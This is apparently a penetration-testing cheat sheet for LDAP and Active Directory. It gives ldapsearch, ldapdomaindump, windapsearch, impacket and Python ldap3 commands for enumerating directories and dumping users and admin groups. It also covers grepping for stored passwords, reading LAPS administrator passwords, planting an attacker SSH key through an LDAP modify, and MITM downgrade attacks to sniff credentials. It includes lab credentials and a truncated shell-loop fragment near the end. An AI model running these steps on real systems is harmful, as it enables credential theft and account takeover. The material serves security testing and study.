# LDAP - 389,636,3268,3269

## LDAP Information

Extracted from: [https://searchmobilecomputing.techtarget.com/definition/LDAP​](https://searchmobilecomputing.techtarget.com/definition/LDAP%E2%80%8B)

LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a "lightweight" (smaller amount of code) version of Directory Access Protocol (DAP).

An LDAP directory can be distributed among many servers. Each server can have a replicated version of the total directory that is synchronized periodically. An LDAP server is called a Directory System Agent (DSA). An LDAP server that receives a request from a user takes responsibility for the request, passing it to other DSAs as necessary, but ensuring a single coordinated response for the user.

An LDAP directory is organized in a simple "tree" hierarchy consisting of the following levels:

```
The root directory (the starting place or the source of the tree), which branches out to

Countries, each of which branches out to

Organizations, which branch out to

Organizational units (divisions, departments, and so forth), which branches out to (includes an entry for)

Individuals (which includes people, files, and shared resources such as printers)
```

Default port: 389 and 636(ldaps). Global Catalog (LDAP in ActiveDirectory) is available by default on ports 3268, and 3269 for LDAPS.

```
PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  tcpwrapped
```

## LDAP Data Interchange Format

LDIF (LDAP Data Interchange Format) defines the directory content as a set of records. It can also represent update requests (Add, Modify, Delete, Rename).

## Enumeration with Python

You can try to enumerate an LDAP with or without credentials using python: pip3 install ldap3

First, try to connect without credentials:

```python
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server)
>>> connection.bind()
True
>>> server.info
```

If the response is True like in the previous example, you can obtain some interesting data of the LDAP (like the naming context or domain name) server from:

```python
>>> server.info
DSA info (from DSE):
Supported LDAP versions: 3
Naming contexts: 
dc=DOMAIN,dc=DOMAIN
```

Once you have the naming context you can make some more exciting queries. This simply query should show you all the objects in the directory:

```python
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
True
>> connection.entries
```

Or dump the whole ldap:

```python
>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
True
>>> connection.entries
```

## Automated Enumeration

Using this you will be able to see the public information (like the domain name):

```sh
nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
```

The nmap ldap-search script can be good for enumeration:

```sh
nmap -p 389 --script ldap-search 10.10.10.119
```

### Write data

Note that if you can modify values you could be able to perform really interesting actions. For example, imagine that you can change the "ssh Public Key" information of your user or any user. It's highly probable that if this attribute exists, then ssh is reading the public keys from LDAP. If you can modify the public key of a user you will be able to log in as that user even if password authentication is not enabled in ssh.

```python
>>> import ldap3
>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
>>> connection.bind()
True
>>> connection.extend.standard.who_am_i()
u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})

This example is taken from: [https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/​](https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/%E2%80%8B)&#x20;

### Clear text credentials

If LDAP is used without SSL you can sniff credentials in plain text in the network.

You can also use the network between the LDAP server and the client to launch a MITM attack. You can perform a Downgrade Attack here, requiring the client to log in using clear text credentials. If SSL is used you can try to make MITM but offering a false certificate, if the user accepts it, you are able to Downgrade the authentication method and see the credentials again.

### Valid Credentials

If you have valid credentials to login into the LDAP server, you can dump all the information about the Domain Admin using:

### ldapdomaindump​

```
pip3 install ldapdomaindump 
ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
```

Simple LDAP dump:

```
ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103
ldapdomaindump -u 'htb.local/svc-alfresco' -p 's3rvice' 10.10.10.161
```

Save the output:

```
ldapdomaindump -u search.htb\\hope.sharp -p 'IsolationIsKey?' 10.10.11.129 -o ldap/
```

This creates a few files in HTML, JSON, and grepable formats:

```
user@computer$ ls ldap/
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep
```

Enumerate the users:

```
cat domain_users.json | jq -r '.[].attributes.sAMAccountName[]' > ../users.txt
```

### windapsearch

windapsearch is amazing for its simplicity.

Enumerate the users:

```
./windapsearch-linux-amd64 -m users --dc monteverde.htb | grep user | cut -d ' ' -f2
./windapsearch-linux-amd64 -d active.htb --dc 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 -m users
```

### impacket-GetADUsers

Enumerate the users:

```
impacket-GetADUsers -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
```

## Manual Enumeration

We can use ldapsearch to:

```
ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=domain,DC=local" | grep sAMAccountName:
```

We can enumerate the description of each user, as we can find sensitive information (like passwords).

```
ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=domain,DC=local" | grep description
```

### ldapsearch

Unauthenticated ldapsearch for naming contexts:

```
ldapsearch -h 10.10.11.129 -x -s base namingcontexts
```

Using a naming context:

```
ldapsearch -h 10.10.11.129 -x -b "DC=search,DC=htb"
```

Authenticated enumeration:

```
ldapsearch -h 10.10.11.129 -D 'hope.sharp@search.htb' -w "IsolationIsKey?" -b "DC=search,DC=htb"
```

Check null credentials or if your credentials are valid:

```
ldapsearch -x -h <IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
```

If you find something saying that the "bind must be completed" means that the credentials are incorrect.

You can extract everything from a domain using:

```
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
-x Simple Authentication
-h LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```

Extract users:

```bash
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

Extract computers:

```bash
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

Extract information from TDL:

```bash
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

Extract Domain Admins:

```bash
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

Extract Domain Users:

```bash
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

Extract Enterprise Admins:

```bash
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

Extract Administrators:

```bash
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

Extract Remote Desktop Group:

```bash
ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TDL>"
```

To see if you have access to any password you can use grep after executing one of the queries:

```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```

Please, notice that the passwords that you can find here could not be the real ones...

    echo "$line";
    ./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
    echo "======================"
done
```

### LDAP LAPS Abuse

Its possible that LAPS or LDAP has been misconfigured enough to potentially contains the computer passwords for computer object in AD. Knowing this we can go back and search LDAP with the credentials with have specifically looking for the _ms-Mcs-AdmPwd attribute._

```shell
ldapsearch -x -h 192.168.64.122 -D 'domain\username' -w 'password' -b 'dc=domain,dc=local' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
